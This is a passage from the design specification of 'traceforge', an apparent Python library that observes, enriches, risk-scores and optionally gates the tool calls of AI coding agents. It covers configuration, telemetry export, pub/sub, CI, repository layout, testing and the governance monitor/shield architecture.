`SqliteSinkConfig`, `JsonlSinkConfig`, `S3SinkConfig`

### Loading Precedence (`config/loader.py`)

From highest to lowest priority:
1. Constructor kwargs passed to `load_config()`
2. Environment variables (`TRACEFORGE_*` prefix, `__` for nesting)
3. `TRACEFORGE_CONFIG` env var (explicit path override)
4. Project-local: `./traceforge.yaml`
5. User-global: `~/.traceforge/config.yaml`
6. Built-in defaults

### Bootstrap

On first config access, `~/.traceforge/` is auto-created with:
- `config.yaml` (default configuration template)
- `mappings/` (directory for user custom mappings)

No separate `traceforge init` command needed.

### Environment Variables

- `TRACEFORGE_CONFIG` — explicit config file path
- `TRACEFORGE_LOG_LEVEL` — scalar override
- `TRACEFORGE_SDK__BATCH_SIZE` — nested override (double underscore = nesting)

---

## §14 — Telemetry / OTEL

✅ **Implemented** — both export *and* self-observability are delivered, with **no telemetry SDK dependency** on either side.

**Done:**
- `OtelSink` (`OtelExporterSink`) exports events / spans / usage / title-updates to an OpenTelemetry collector via **OTLP/HTTP JSON**. It is intentionally hand-rolled with **no `opentelemetry-sdk` dependency** (simplified OTLP JSON, not protobuf) to stay lightweight — this is a settled design decision, not a gap.
- Span generation from tool-call pairs (enricher pairing + `TelemetrySpan` + `OtelExporterSink._event_to_span`).
- Pipeline-level **self-metrics** (`traceforge.telemetry`): `PipelineMetrics` is an opt-in, in-process accumulator attached via `EventPipeline(..., metrics=PipelineMetrics())`. It records throughput (events/sec), enrichment latency, per-sink write time, and dropped / failed-sink counts, read back as an immutable `MetricsSnapshot` (surfaced on `flush()` / `close()`, and logged at DEBUG on flush).
  - **Disabled path is a true no-op.** Without a `metrics=` instance the hot path makes **no timing calls and no metrics allocations** — every instrumentation site is guarded on `metrics is not None`, and the sink fan-out takes its original unwrapped path. This is enforced by a test that spies on `time.perf_counter` and asserts zero calls on the disabled path.
  - **No metrics-framework dependency.** Deliberately **no `opentelemetry-sdk`** and **no `prometheus`** — no background threads, no parallel transport, no unbounded accumulation (state is bounded: scalar counters plus one entry per sink). This mirrors the hand-rolled OTLP decision above: traceforge's self-observability is a plain accumulator, not a vendored SDK.

---

## §15 — EventBus

✅ **Delivered** via the sink model plus a subscribe convenience — no separate bus module is needed.

An in-process consumer can react to events without implementing a full sink: `StorageSink` makes only `on_event` abstract (`flush`/`close`/`on_span`/`on_usage`/`on_title_update` are default no-ops), and `CallbackSink` lets a consumer subscribe with a single callback. `EventPipeline`'s error-isolated fan-out is the publish side, so one failing subscriber never blocks the others or the pipeline.

**The official lightweight pub/sub API is `EventPipeline.subscribe`:**

```python
pipeline.subscribe(on_event, *, kind=None, to_thread=False) -> CallbackSink
pipeline.unsubscribe(sink) -> bool
```

- `subscribe` wraps `on_event` in a `CallbackSink` and appends it to the fan-out; it returns that sink, which doubles as the handle for `unsubscribe`.
- `on_event` may be **async or a plain sync callable** — the one genuinely new capability. Sync callbacks run inline on the event loop by default (right for append-to-list / put-on-queue consumers); pass `to_thread=True` to run a blocking callback via `asyncio.to_thread` so it never stalls the loop. (Adapter: `traceforge.sinks.callback.as_async_event_callback`.)
- `kind` is an optional per-subscriber filter checked **before** dispatch: an exact kind, a `"prefix.*"` wildcard (e.g. `"tool.*"`), an iterable of those, or a predicate over the event.

`EventPipeline(sinks=[CallbackSink(on_event=handler)])` remains equivalent for construction-time wiring; `subscribe` is the ergonomic path for adding/removing consumers on a live pipeline — no sink subclassing, no flush/close lifecycle, no persistence contract.

**Out of scope by design:** no message broker / cross-process transport — that is the wrong tier for an embedded library; external egress is handled by the `OtelExporterSink` (OpenTelemetry is the boundary contract).

---

## §16 — Formatting

✅ **Implemented** — the `formatting/` package provides human-readable event display.

- Compact and verbose output modes
- Color and structured output for debugging

---

## §17 — CI / CD

### Workflows (`.github/workflows/`)

| Workflow | Trigger | Purpose |
|----------|---------|---------|
| `ci-lint.yml` | Push / PR | `ruff check` + `ruff format --check` |
| `ci-test.yml` | Push / PR | `pytest` with Python 3.11, 3.12, 3.13 matrix |
| `publish.yml` | Release tag | Build + publish to PyPI |
| `tool-surface-audit.yml` | Weekly | Audit tool classification coverage |
| `weekly-compat-audit.yml` | Weekly | Compatibility checks against framework updates |

### Branch Protection

- Required: `ci-lint` and `ci-test` pass on all matrix versions
- Copilot agent setup: `copilot-setup-steps.yml`

---

## §18 — Repository Structure

`
traceforge/
├── .github/
│   ├── copilot-setup-steps.yml
│   └── workflows/
│       ├── ci-lint.yml
│       ├── ci-test.yml
│       ├── publish.yml
│       ├── tool-surface-audit.yml
│       └── weekly-compat-audit.yml
├── src/traceforge/
│   ├── __init__.py              # Public API surface
│   ├── __main__.py              # `python -m traceforge`
│   ├── _generated.py            # Generated EventKind constants
│   ├── models.py                # StrictModel, FrozenModel bases
│   ├── types.py                 # EventKind, SessionEvent, EventMetadata, TitleUpdate, etc.
│   ├── trace.py                 # EventTrace, TraceStage (unified classification + assessment)
│   ├── pipeline.py              # EventPipeline (fan-out + live phase/boundary/title structuring)
│   ├── enricher.py              # Stateful enrichment (pairing, classification, risk)
│   ├── adapters/
│   │   ├── __init__.py
│   │   ├── base.py              # Adapter, JsonLineAdapter ABCs
│   │   ├── mapped_json.py       # MappedJsonAdapter (YAML-driven)
│   │   ├── otel.py              # OtelSpanAdapter (MAF spans)
│   │   └── genai_otel.py        # GenAIOtelAdapter (generic gen_ai.* OTel receiver; experimental, not yet registered)
│   ├── sources/
│   │   ├── __init__.py
│   │   ├── base.py              # Source ABC, RawRecord
│   │   ├── file_watch.py        # FileWatchSource (watchdog)
│   │   ├── file_poll.py         # FilePollSource (interval)
│   │   ├── http_poll.py         # HttpPollSource (ETag/conditional)
│   │   ├── sse.py               # SSESource (WHATWG spec)
│   │   ├── sqlite.py            # SqliteSource (row polling)
│   │   ├── replay.py            # ReplaySource (one-shot)
│   │   └── auto_detect.py       # Framework auto-detection helper (backs `traceforge detect`; not a Source)
│   ├── sinks/
│   │   ├── __init__.py
│   │   ├── base.py              # StorageSink ABC
│   │   ├── callback.py          # CallbackSink (async callables)
│   │   ├── console.py           # ConsoleSink (pretty terminal output)
│   │   ├── jsonl.py             # JsonlSink (append-only, rotation)
│   │   ├── sqlite_output.py     # SqliteSink (local SQLite)
│   │   ├── s3.py                # S3Sink (object storage)
│   │   ├── parquet.py           # ParquetSink (columnar analytics)
│   │   ├── otel_exporter.py     # OtelExporterSink (OTLP spans)
│   │   └── webhook.py           # WebhookSink (POST to URL)
│   ├── parsers/
│   │   ├── __init__.py
│   │   ├── base.py              # MarkdownPreParser ABC
│   │   ├── copilot.py           # CopilotPreParser
│   │   └── aider.py             # AiderPreParser
│   ├── preprocessors/           # 14 preprocessors
│   │   ├── __init__.py          # Registry + all imports
│   │   ├── registry.py          # register/get_preprocessor
│   │   ├── amazonq.py
│   │   ├── antigravity.py
│   │   ├── claude.py
│   │   ├── cline.py
│   │   ├── codex.py
│   │   ├── continue_dev.py
│   │   ├── copilot_vscode.py
│   │   ├── goose.py
│   │   ├── maf_transcript.py
│   │   ├── openai_agents.py
│   │   ├── opencode.py
│   │   ├── openhands.py
│   │   ├── pydantic_ai.py
│   │   └── smolagents.py
│   ├── classify/
│   │   ├── __init__.py          # Public API re-exports
│   │   ├── core.py              # Mechanism, Effect, Scope, Role, Action, etc.
│   │   ├── coding.py            # CodingMechanism, CodingScope, CodingRole, etc.
│   │   ├── config.py            # ClassifyConfig, ClassificationEngine, loader
│   │   ├── workflow.py          # Phase, Visibility
│   │   ├── shell.py             # Bash shell classifier (tree-sitter)
│   │   ├── powershell.py        # PowerShell classifier (tree-sitter)
│   │   ├── cmd.py               # cmd.exe classifier (tokenization)
│   │   ├── tools.py             # Native tool classification
│   │   ├── mcp.py               # MCP profile-based classification
│   │   ├── rules.py             # Declarative rule matching, ShellActivity
│   │   ├── risk.py              # Risk scoring (0-100, MITRE mappings)
│   │   ├── phases.py            # Phase derivation logic
│   │   ├── registry.py          # DimensionRegistry
│   │   ├── schema.yaml          # Tier-1 taxonomy schema (source of truth for _generated.py)
│   │   └── data/                # YAML config files (10 files)
│   │       ├── binary_info.yaml
│   │       ├── canonical_tools.yaml
│   │       ├── effect_overrides.yaml
│   │       ├── mcp_profiles.yaml
│   │       ├── recommendation_rules.yaml
│   │       ├── risk.yaml
│   │       ├── shell_defaults.yaml
│   │       ├── shell_rules.yaml
│   │       ├── tool_classifications.yaml
│   │       └── verb_inference.yaml
│   ├── config/
│   │   ├── __init__.py
│   │   ├── models.py            # TraceforgeConfig, PipelineConfig, unions
│   │   ├── loader.py            # Hierarchical config loading
│   │   ├── defaults.py          # Default config template
│   │   └── mappings.py          # Mapping file resolver
│   ├── mappings/                # Bundled YAML mappings (22 files)
│   │   ├── __init__.py
│   │   ├── aider.yaml
│   │   ├── aider_markdown.yaml
│   │   ├── amazonq.yaml
│   │   ├── antigravity.yaml
│   │   ├── claude.yaml
│   │   ├── cline.yaml
│   │   ├── codex.yaml
│   │   ├── continue_dev.yaml
│   │   ├── copilot.yaml
│   │   ├── copilot_markdown.yaml
│   │   ├── copilot_vscode.yaml
│   │   ├── crewai.yaml
│   │   ├── goose.yaml
│   │   ├── langgraph.yaml
│   │   ├── maf.yaml
│   │   ├── maf_transcript.yaml
│   │   ├── openai_agents.yaml
│   │   ├── opencode.yaml
│   │   ├── openhands.yaml
│   │   ├── pydantic_ai.yaml
│   │   ├── smolagents.yaml
│   │   └── sweagent.yaml
│   ├── telemetry/
│   │   └── __init__.py          # 🚧 Stub (self-metrics, #48). OTLP export ships via sinks/otel_exporter.py
│   ├── formatting/
│   │   ├── __init__.py
│   │   ├── budget.py            # Budget / quota formatting
│   │   └── density.py           # Event-density summarization
│   ├── phase/                   # Live ML phase inference (default-on)
│   │   ├── __init__.py
│   │   ├── inferencer.py        # PhaseInferencer (stamps metadata.phase)
│   │   ├── inference.py
│   │   ├── features.py
│   │   ├── event_rows.py
│   │   ├── segmentation.py
│   │   └── data/                # Packaged phase model: sklearn head (phase-model.joblib) + frozen model2vec embedder (potion-base-8M/)
│   ├── boundary/                # Live ML activity/step segmentation (default-on)
│   │   ├── __init__.py
│   │   ├── inferencer.py        # BoundaryInferencer (stamps metadata.boundary)
│   │   ├── inference.py
│   │   ├── features.py
│   │   ├── decode.py
│   │   └── data/                # Packaged boundary model (boundary-model.joblib, sklearn)
│   ├── title/                   # Segment + session titling (segment titling opt-in)
│   │   ├── __init__.py
│   │   ├── inferencer.py        # TitleInferencer (emits async TitleUpdate)
│   │   ├── inference.py
│   │   ├── context.py
│   │   ├── heuristics.py        # Zero-dep extractive session-title cascade
│   │   ├── hygiene.py
│   │   ├── naming.py            # HeuristicProvider / ApiProvider / build_session_titler
│   │   ├── _resolve.py
│   │   └── data/                # boilerplate_files.json (title hygiene); segment-titler ONNX model ships separately in the traceforge-title-model package
│   ├── tracking/                # Deterministic phase segmenter (research signal, not live path)
│   │   ├── __init__.py
│   │   ├── models.py
│   │   └── phase_tracker.py     # PhaseTracker
│   ├── governance/              # Governance / assessment engine (27 modules)
│   │   ├── __init__.py          # Public API re-exports
│   │   ├── pipeline.py          # GovernancePipeline — composition root / facade (delegates)
│   │   ├── monitor.py           # SessionMonitor — single writer (observe / process / lifecycle)
│   │   ├── scorer.py            # Scorer — read-only preview (score_tool_call* / preflight)
│   │   ├── context.py           # ContextBuilder — payload / event -> EnrichmentContext
│   │   ├── phase1.py            # Phase1 — Phase-1 state-advance step (writer + preview share it)
│   │   ├── assessor.py          # Assessor — (snapshot, event) -> SessionMeta (label+risk+drift)
│   │   ├── registry.py          # SessionRegistry — residency + LRU eviction + reservations
│   │   ├── codec.py             # MetaCodec — (de)serialize SessionMeta + snapshots
│   │   ├── shield.py            # Shield — enforcement (gate context + pre/postflight + record)
│   │   ├── results.py           # RecommendedAction, RiskRecommendation, SessionMeta, Evidence
│   │   ├── types.py             # EnrichmentContext, ToolCallEvent, ToolResultEvent
│   │   ├── state.py             # SessionState, budget / taint snapshots
│   │   ├── labeler.py           # GovernanceLabeler (Phase 2 data labeling)
│   │   ├── rules.py             # Data-driven rule engine
│   │   ├── risk_wrapper.py      # Governance risk modifiers
│   │   ├── pii.py               # PIIScanner
│   │   ├── ifc.py               # IFCChecker (information-flow control)
│   │   ├── integrity.py         # IntegrityVerifier
│   │   ├── drift.py             # Phase DriftDetector
│   │   ├── mcp_drift.py         # MCPIntegrityScanner
│   │   ├── budget.py            # BudgetTracker
│   │   ├── canonical.py         # Canonical event hashing
│   │   ├── envelope.py          # EnrichedEvent, ContextGapEvent
│   │   ├── emitter.py           # EnrichedEmitter (async audit emission + backpressure)
│   │   ├── observer.py          # TraceforgeObserver adapter
│   │   └── persistence.py       # SystemStore (SQLite persistence)
│   ├── sdk/                     # Pipeline + gating SDK
│   │   ├── __init__.py          # Pipeline, EventTrace, Verdict, GatePolicy re-exports
│   │   ├── pipeline.py          # Pipeline — SDK facade (observation backbone + governance stage + gate_* helpers)
│   │   ├── gate_policy.py       # GatePolicy, preflight / postflight gates
│   │   ├── gate_types.py        # GateContext, ToolCallRequest / Result
│   │   └── verdict.py           # Verdict, Decision
│   ├── gate/                    # Cross-process gate IPC + external PDP gates
│   │   ├── __init__.py
│   │   ├── client.py
│   │   ├── server.py
│   │   ├── external.py          # HttpGate / SubprocessGate (out-of-process PDP)
│   │   └── registry.py
│   ├── gates/                   # Bundled gate detectors
│   │   ├── __init__.py
│   │   ├── pii.py
│   │   └── pii_patterns.yaml
│   ├── migrations/              # Alembic SQLite migrations
│   │   ├── __init__.py
│   │   ├── env.py
│   │   ├── runner.py
│   │   ├── models.py
│   │   ├── script.py.mako
│   │   └── versions/
│   └── cli/                     # Click CLI (entry point traceforge.cli:main)
│       ├── __init__.py          # Command group: "governance pipeline for AI coding agents"
│       ├── watch.py             # traceforge watch          (config-driven live pipeline)
│       ├── replay.py            # traceforge replay         (one-shot file reprocess)
│       ├── score.py             # traceforge score          (preflight scoring HTTP server)
│       ├── gate_cmd.py          # traceforge gate           (apply a gate policy)
│       ├── detect.py            # traceforge detect         (framework auto-detection)
│       ├── config_cmd.py        # traceforge config         (inspect / emit config)
│       ├── status.py            # traceforge status         (environment / model status)
│       ├── init_cmd.py          # traceforge init           (scaffold ~/.traceforge)
│       ├── runner.py            # Shared pipeline runner
│       └── factory.py           # Source / adapter / sink construction from config
├── tests/
│   ├── __init__.py
│   ├── conftest.py
│   ├── fixtures/
│   │   ├── gen_fixtures.py          # Fixture data generation script
│   │   ├── aider_chat_history.md
│   │   ├── claude_session.jsonl
│   │   ├── copilot_session.jsonl
│   │   └── malformed.jsonl
│   ├── unit/
│   │   ├── __init__.py
│   │   ├── test_adapters.py
│   │   ├── test_aider_preparser.py
│   │   ├── test_callback_sink.py
│   │   ├── test_classification.py
│   │   ├── test_classify.py
│   │   ├── test_classify_shells.py
│   │   ├── test_enricher.py
│   │   ├── test_mapped_json.py
│   │   ├── test_mcp.py
│   │   ├── test_otel_adapter.py
│   │   ├── test_pipeline.py
│   │   ├── test_risk.py
│   │   ├── test_types.py
│   │   ├── test_governance_*.py     # governance-engine suite (pipeline, labeler, pii, ifc, integrity, drift, persistence, state, codec, escalation, …)
│   │   ├── test_phase_streaming.py  # phase classifier (+ test_phase_tracker.py)
│   │   ├── test_boundary_*.py       # boundary decoder (decode, features, streaming)
│   │   └── test_title_*.py          # titler (context, heuristics, inference, inferencer, naming, resolve)
│   ├── integration/
│   │   ├── __init__.py
│   │   ├── test_aider_contract.py
│   │   ├── test_new_mappings.py
│   │   ├── test_opencode_e2e.py
│   │   ├── test_pipeline_e2e.py
│   │   ├── test_yaml_comprehensive_e2e.py
│   │   └── test_yaml_e2e_real_data.py
│   ├── e2e/                         # End-to-end governance / observation flows
│   │   ├── __init__.py
│   │   ├── test_observation_pipeline_e2e.py
│   │   ├── test_motivation_pipeline_e2e.py
│   │   ├── test_framework_gating_e2e.py
│   │   ├── test_real_agent_flows_e2e.py
│   │   └── test_raw_traces.py
│   ├── test_config.py
│   ├── test_copilot_preparser.py
│   └── test_sqlite_source.py
├── scripts/
│   └── check_framework_compat.py  # Weekly compat audit helper
├── pyproject.toml
├── README.md
├── SPEC.md
├── LICENSE
└── uv.lock
`

---

## §19 — Design Constraints

1. **Pure observation** — traceforge observes, enriches, and delivers. It never modifies agent behavior, injects prompts, or manages processes.

2. **Zero-code configuration** — users configure traceforge entirely through YAML and environment variables. Adding a framework = new YAML mapping. Choosing sinks = YAML config. No Python code required for normal operation.

3. **Defensive parsing** — adapters/parsers never crash. Unknown fields are ignored. Malformed input is logged and skipped.

4. **Immutable domain objects** — all events flowing through the pipeline are frozen Pydantic models. Enrichment produces new copies.

5. **Error isolation** — one failing sink cannot block others. One malformed event cannot crash the pipeline.

6. **Async-native** — sources, pipeline, and sinks are async. I/O runs in background threads where needed.

7. **No global mutable state** — config is loaded explicitly (with caching for convenience). The default engine is a module-level singleton but can be reset/replaced.

8. **Hierarchical classification** — dot-path taxonomy supports both flat queries (`has_action("validate")`) and precise queries (`has_action("validate.lint")`).

9. **Data-driven rules** — classification rules, risk scoring weights, MCP profiles, and binary metadata are all externalized to YAML files. Users can override any rule without touching Python code.

10. **Open-closed EventKind** — the kind registry is open. Any string is a valid kind. New frameworks can introduce new kinds without code changes. Canonical kinds provide autocomplete and filtering.

---

## §20 — Testing Strategy

### Unit Tests (`tests/unit/`)

55 test modules covering:
- Type construction and validation (`test_types.py`)
- Adapter parsing logic (`test_adapters.py`, `test_mapped_json.py`, `test_otel_adapter.py`)
- Parser output (`test_aider_preparser.py`)
- Sink behavior (`test_callback_sink.py`)
- Classification correctness (`test_classification.py`, `test_classify.py`, `test_classify_shells.py`, `test_mcp.py`)
- Enricher pairing/flush logic (`test_enricher.py`)
- Risk scoring (`test_risk.py`)
- Pipeline fan-out and error isolation (`test_pipeline.py`)
- Governance engine (`test_governance_*` — pipeline, single-writer, labeler, PII, IFC, integrity, drift, persistence + normalized schema, state, codec, escalation/evidence, migrations)
- Live structuring (`test_phase_streaming.py`, `test_phase_tracker.py`, `test_boundary_*`, `test_title_*`)

### Integration Tests (`tests/integration/`)

11 test modules covering:
- End-to-end pipeline flow (`test_pipeline_e2e.py`)
- YAML mapping validation against real framework data (`test_yaml_e2e_real_data.py`, `test_yaml_comprehensive_e2e.py`)
- New mapping contract tests (`test_new_mappings.py`)
- Aider parser contract (`test_aider_contract.py`)
- Framework mappings (`test_opencode_e2e.py`, `test_antigravity_e2e.py`, `test_copilot_vscode_e2e.py`)
- Observe → enrich → emit integration (`test_enrich_emit_integration.py`)
- Motivation tracking (`test_motivation_e2e.py`)
- End-to-end governance pipeline (`test_governance_e2e.py`)

### End-to-End Tests (`tests/e2e/`)

5 test modules exercising full observe → enrich → structure → emit flows against recorded agent traces:
- Observation pipeline (`test_observation_pipeline_e2e.py`)
- Motivation pipeline (`test_motivation_pipeline_e2e.py`)
- Framework gating (`test_framework_gating_e2e.py`)
- Real agent flows (`test_real_agent_flows_e2e.py`)
- Raw trace ingestion (`test_raw_traces.py`)

### Top-Level Tests

- `test_config.py` — configuration loading, precedence, env var overrides
- `test_copilot_preparser.py` — CopilotPreParser markdown + log line parsing
- `test_sqlite_source.py` — SqliteSource polling behavior

### Test Infrastructure

- `pytest-asyncio` with `asyncio_mode = "auto"`
- Fixtures in `tests/fixtures/` (sample event data)
- Python 3.11 / 3.12 / 3.13 CI matrix

---

## §21 — Implementation Status & Roadmap

### ✅ Done

| Subsystem | Status | Notes |
|-----------|--------|-------|
| Core types | ✅ Complete | SessionEvent, EventKind (75+ constants), EventMetadata, TelemetrySpan, UsageRecord |
| Base models | ✅ Complete | StrictModel, FrozenModel |
| Source ABC + 6 implementations | ✅ Complete | file_watch, file_poll, http_poll, SSE, sqlite, replay |
| Adapter ABC + 2 implementations | ✅ Complete | MappedJsonAdapter, OtelSpanAdapter |
| YAML mapping system | ✅ Complete | 22 bundled mappings, resolver, user override support |
| Preprocessor registry + 14 preprocessors | ✅ Complete | claude, cline, goose, openhands, pydantic_ai, smolagents, amazonq, antigravity, codex, continue_dev, copilot_vscode, maf_transcript, openai_agents, opencode |
| Parser system + 2 parsers | ✅ Complete | CopilotPreParser, AiderPreParser (tree-sitter based) |
| Enricher | ✅ Complete | Tool pairing, duration, classification dispatch, risk, visibility, phase signals |
| Classification engine | ✅ Complete | Multi-dimensional taxonomy, shell AST (bash/PS/cmd), MCP profiles, tool lookup |
| Risk scoring | ✅ Complete | Structural + flags + injection + taint + context. MITRE mappings. |
| EventPipeline | ✅ Complete | Fan-out, error isolation, enricher integration |
| Storage sinks (8) | ✅ Complete | Callback, Console, Jsonl, Sqlite, S3, Parquet, OtelExporter, Webhook |
| Telemetry self-metrics | ✅ Complete | `traceforge.telemetry.PipelineMetrics`: opt-in `EventPipeline(metrics=...)` accumulator — throughput, enrichment latency, per-sink write time, dropped / failed-sink counts, immutable `MetricsSnapshot`. Disabled path is a true no-op (no timers/allocs on the hot path); no `opentelemetry-sdk` / `prometheus` dep. §14. Closed #48 |
| EventBus subscribe / pub-sub | ✅ Complete | `EventPipeline.subscribe(on_event, *, kind=None, to_thread=False)` + `unsubscribe()` over the error-isolated fan-out; sync-or-async callbacks, optional per-subscriber `kind` filter. §15. Closed #47 |
| CLI | ✅ Complete | `cli/` (Click): watch, replay, score, gate, detect, config, status, init |
| Gate module | ✅ Complete | Sync scoring path + PII gate + registry (`gate/`, `gates/`) |
| Live structuring (phase / boundary / title) | ✅ Complete | CPU-only, torch-free. Phase + boundary sklearn heads (joblib) over a frozen model2vec embedder, default-on, stamp `metadata.phase` / `metadata.boundary` live; T5 titler (int8 split-ONNX, opt-in) emits out-of-band `TitleUpdate`. Titler weights ship in the separate `traceforge-title-model` package. See §23 |
| Governance / assessment engine | ✅ Complete | `governance/` monitor + shield object model (SOLID): `SessionMonitor` (single writer), `Scorer` (read-only preview), `SessionRegistry`, `Assessor`, `Shield`, one-counter `SessionState`, `GovernancePipeline` facade; plus labeler, rules, PII, IFC, integrity, drift, budget, observer, emitter, persistence. Epic #7 (stories #9–#27) fully delivered and closed. See §22 |
| Configuration system | ✅ Complete | Hierarchical loading, env overrides, discriminated unions, bootstrap |
| Classify data files (10 YAMLs) | ✅ Complete | Binary info, verb/shell/effect rules, MCP profiles, tool classifications, risk config, governance recommendation rules |
| CI/CD | ✅ Complete | Lint, test matrix, publish, weekly audits |
| Test suite | ✅ Complete | 2242 passing / 4 skipped across 74 test modules (unit / integration / e2e / top-level) |

### ⬜ Planned (Not Yet Implemented)

| Item | Priority | Dependencies | Notes |
|------|----------|--------------|-------|
| **PyPI release** | Medium | None | Publish `traceforge-toolkit` + `traceforge-title-model` to PyPI. Packaging and CI publish workflow are already in place. |

> **Delivered since this table was first written:** the live structuring subsystem
> (`phase/` + `boundary/` + `title/`, formerly PR #35, now specified in §23) and the
> governance epic (#7, stories #9–#27) are merged and shipping. All stories — including
> end-to-end governance **integration tests (#27)** — are delivered and closed; the epic
> (#7) closes with this documentation reconciliation (#49).

### Implementation Order (Recommended)

`
1. PyPI release → publish traceforge-toolkit + traceforge-title-model
`

---

## §22 — SDK, Runtime Monitor & Shield

*One session-state authority. The **monitor** observes; the **shield** enforces. Both compose
the same assessment. Objects with single responsibilities, wired by dependency injection.*

### Scope

traceforge observes, parses, enriches, classifies, risk-scores, and structures agent events
(§9–§11). **Governance is neither a separate track nor the whole pipeline** — it is a *runtime
monitor* over a session's event trace, plus an optional *shield* (runtime enforcement) at the
framework's execution boundary.

* The **monitor** consumes enriched events, advances one per-session state, and produces an
  assessment (data labeling, information-flow control, drift, budget, rule evaluation) stamped
  onto `event.metadata.governance` as a `SessionMeta`. It is observation-first: it *recommends*
  (`allow` / `warn` / `escalate` / `deny` / `transform`) and the consumer decides.
* The **shield** is opt-in. When a `GatePolicy` is registered, it turns a recommendation into an
  enforced `Verdict` at the framework's native pre/post-execution hook. Nothing is enforced
  unless a policy is registered, so the default posture stays pure observation.

Monitor and shield are **objects with single responsibilities composed by dependency injection**,
not a monolith. This section specifies that object model.

### The object model

The engine dissolves into focused collaborators, each with one reason to change.
`GovernancePipeline` is the **composition root / facade** that wires them and exposes the public
API; the SDK `Pipeline` composes it with the observation backbone.

| Collaborator | Single responsibility | Depends on |
|---|---|---|
| `SessionState` | Encapsulate one session's accumulators — **one** tool-call counter, budget dimensions, taint ledger, phase window, gate history. Mutated only through its own methods; exposes an immutable `snapshot()` and a detached `clone` for previews. | — |
| `SystemStore` | Durability: idempotency reservations, atomic commit, crash recovery, audit persistence. | sqlite |
| `SessionRegistry` | Residency: the one place sessions are created and found, keeping two separate scopes — **durable** observation state (DB-backed, the single writer's) and **ephemeral** gate state (`_db=None`, never cross-thread sqlite) — so the writer always persists and the gate never touches the DB; plus eviction and reservation bookkeeping. | `SystemStore` |
| `ContextBuilder` | Bridge a raw hook payload / adapted `SessionEvent` into an `EnrichmentContext` (classification + shell-command analysis). | engine |
| `Phase1` | The Phase-1 state-advance step — budget, taint (IFC), phase window, pressure — applied to whichever `SessionState` it is handed (the real one, or a clone). | budget, labeler |
| `Assessor` | Turn `(snapshot, event)` into a `SessionMeta` — label + risk + recommendation + drift + MCP. Side-effect-free. | labeler, rules, engine |
| `MetaCodec` | Serialize / deserialize `SessionMeta` and state snapshots for reservations and the audit trail. | — |
| `SessionMonitor` | The **single writer**: per event, advance the real `SessionState` via `Phase1`, commit atomically, then call the `Assessor`. Owns `observe` / `process` / `lifecycle`. | `SessionRegistry`, `Phase1`, `Assessor`, `MetaCodec` |
| `Scorer` | The **read side**: preview the same `Phase1` + `Assessor` against a **detached clone**, mutating no session state (audit-only persistence). Owns `score_tool_call*` / `preflight`. | `ContextBuilder`, `Phase1`, `Assessor`, `SessionRegistry` |
| `GatePolicy` (Policy) | Map an assessed request/result to a `Verdict` (pre) / `PostflightVerdict` (post). An injected strategy. | — |
| `Shield` | Runtime enforcement: build the gate context from `SessionState`, run the policy's pre/post chains, record allow/deny. | `GatePolicy`, `SessionRegistry` |
| `gate_*` adapters | Bind one framework's execution hooks to the `Shield` (the edit-automaton at the edge). | `Shield` |
| `GovernancePipeline` | **Composition root + facade**: build the collaborators; delegate `observe_event` / `score_tool_call*` / `process_*` / `gate_*`. | all of the above |

```mermaid
flowchart TB
  subgraph Facade["GovernancePipeline — composition root / facade"]
    direction TB
    MON["SessionMonitor<br/>(single writer)"]
    SCO["Scorer<br/>(read-only preview)"]
    SH["Shield<br/>(enforcement)"]
  end
  REG["SessionRegistry<br/>(durable + gate residency)"]
  ST["SessionState<br/>(one counter, methods only)"]
  ASS["Assessor<br/>(label · risk · drift · recommend)"]
  POL["GatePolicy<br/>(Verdict strategy)"]
  STORE["SystemStore<br/>(durability)"]

  MON --> REG
  MON --> ASS
  SCO --> REG
  SCO --> ASS
  SH --> REG
  SH --> POL
  REG --> ST
  REG --> STORE
  MON -. advances .-> ST
  SCO -. clones · no write .-> ST
  SH -. reads via methods .-> ST

  classDef writer fill:#fde2e8,stroke:#b3365f;
  class MON writer;
```

* **Single Responsibility** — no object both accumulates state and decides enforcement.
* **Open/Closed** — `Assessor` and `GatePolicy` are strategies; swap them without editing the
  monitor.
* **Liskov** — any `Assessor` / `GatePolicy` implementation is substitutable.
* **Interface Segregation** — the shield reads gate history through narrow `SessionState`
  methods, never its fields.
* **Dependency Inversion** — the monitor and shield depend on injected collaborators,
  constructed once at the composition root.

### One session-state authority

`SessionState` owns exactly one tool-call counter. It previously carried two — a budget counter
(advanced on observation) and a gate counter (advanced on allow) — the same quantity written by
two owners on two clocks, never reconciled. They are now a single `tool_call_count` advanced
through one method; budget pressure and the gate context both read it. State is mutated only
through methods (`observe_tool_call`, `record_allow`, `record_denial`, `add_taint`, …), and
collaborators that need gate history call methods (`denied_count`, `prior_verdicts`,
`prior_tool_call_ids`) rather than touching fields. Encapsulation makes the twin-counter and
cross-module-poke classes of bug unrepresentable.

### Monitor observes, shield enforces

Two compositions of the same collaborators:

* **Observation (monitor alone).** Every pushed event is enriched → classified → structured →
  **observed** (state advances once, on the canonical tool-call event) → assessed → emitted with
  its `SessionMeta`. With no `GatePolicy`, nothing is enforced.
* **Enforcement (monitor + shield).** At a framework's pre-execution hook the shield builds a
  gate context from `SessionState`, runs the policy's preflight chain, and returns a `Verdict`
  (allow / deny) enforced by the framework's native mechanism; a postflight chain can
  redact / suppress / alert on the result. The shield records the outcome back into the same
  `SessionState`, so budget stays honest: a denied call never reaches the monitor's commit and
  costs no budget.

The facade exposes one **write** entry point (the monitor) and two **read** entry points (the
scorer), distinguished by state semantics:

| Method (facade) | Owner | Input | Session state | Returns | Use |
|--------|--------|-------|---------------|---------|-----|
| `observe_event(event)` | `SessionMonitor` | `SessionEvent` | **advances (persists)** | `SessionMeta` | the pipeline stage (budget / taint / drift accrue) |
| `score_tool_call_event(event)` | `Scorer` | `SessionEvent` | read-only (clone) | `SessionMeta` | preflight from an adapted event |
| `score_tool_call(payload)` | `Scorer` | `dict` | read-only (clone) | `EventTrace` | preflight from a hook |

`observe_event` is the mutating stage the `EventPipeline` calls; `score_tool_call*` preview against
a **detached clone** of current state, committing nothing. Because the monitor is the single writer
and the assessor is side-effect-free, a read-only score is literally "advance a throwaway clone the
real session never sees, then assess its snapshot." Writer (`SessionMonitor`) and reader (`Scorer`)
share the same `Phase1` and `Assessor`, so preview and live scoring cannot diverge.

### Determinism contract

Replaying a trace must reproduce the live assessment. Therefore **non-deterministic enrichment is
an injected collaborator whose output is captured onto the event, never re-derived inside state
mutation.** ML structurers (phase / boundary / title, §11) run once at ingestion and write their
result onto the event; the monitor's Phase-1 mutation reads only captured values and
deterministic heuristics. Replay injects a "captured-value" inferencer and reaches identical
state. (Dependency Inversion applied to time: the *source* of a value is a dependency, so live
and replay differ only in which implementation is injected.)

